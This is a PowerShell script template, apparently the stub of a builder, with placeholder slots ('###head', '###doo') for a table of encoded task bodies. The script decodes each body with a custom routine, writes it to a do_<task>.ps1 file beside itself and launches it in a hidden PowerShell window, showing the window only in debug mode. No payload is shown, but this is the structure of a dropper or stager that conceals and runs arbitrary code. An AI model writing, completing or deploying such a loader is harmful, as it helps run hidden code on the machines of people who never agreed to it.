###head
###head

. ./utils.ps1

function GetScriptPath {
    param
    (
    [Parameter(Mandatory = $true)]
    [string]
    $scriptPath,

    [Parameter(Mandatory = $true)]
    [string[]]
    $taskName
    )
    $directoryPath = Split-Path -Path $scriptPath -Parent
    $fullPath = Join-Path -Path $directoryPath -ChildPath "do_$taskName.ps1"
    return $fullPath
}

function Save-Script
{
    param
    (
        [Parameter(Mandatory = $true)]
        [string]
        $scriptPath,

        [Parameter(Mandatory = $true)]
        [string[]]
        $taskName,

        [Parameter(Mandatory = $true)]
        [string[]]
        $body
    )
    $fullPath = GetScriptPath -scriptPath $scriptPath -taskName $taskName
    CustomDecode -inContent $body -outFile $fullPath
    return $fullPath
}

function Invoke-Script
{
    param
    (
        [Parameter(Mandatory = $true)]
        [string]
        $scriptPath,

        [Parameter(Mandatory = $true)]
        [string[]]
        $taskName
    )
    $fullPath = GetScriptPath -scriptPath $scriptPath -taskName $taskName
    if ($globalDebug)
    {
        Start-Process powershell.exe -WindowStyle Normal -ArgumentList "-file ""$fullPath"" -Task $taskName"
    }
    else
    {
        Start-Process powershell.exe -WindowStyle Hidden -ArgumentList "-file ""$fullPath"" -Task $taskName"
    }
}

$global:Task = $null

for ($i = 0; $i -lt $args.Count; $i++) {
    if ($args[$i] -eq '-Task') {
        if ($i + 1 -lt $args.Count) {
            $global:Task = $args[$i + 1]
        } else {
            writedbg "No value provided for -Task argument."
        }
    }
}

function Main 
{
    $scriptPath = Get-ScriptPath
    writedbg "program curScript: $scriptPath"

    if ($global:Task) {
        writedbg "Task - $task"
        & $global:Task
    } else 
    {               

   
        $tasks = @{
           ###doo
        }

        writedbg "Main - "
        foreach ($key in $tasks.Keys)
        {
            $task = $key
            $body = $tasks.$key
            writedbg "Main - $task"
            Save-Script -scriptPath $scriptPath -taskName $task -Body $body
            Invoke-Script -scriptPath $scriptPath -taskName $task
        }
    }
}

Main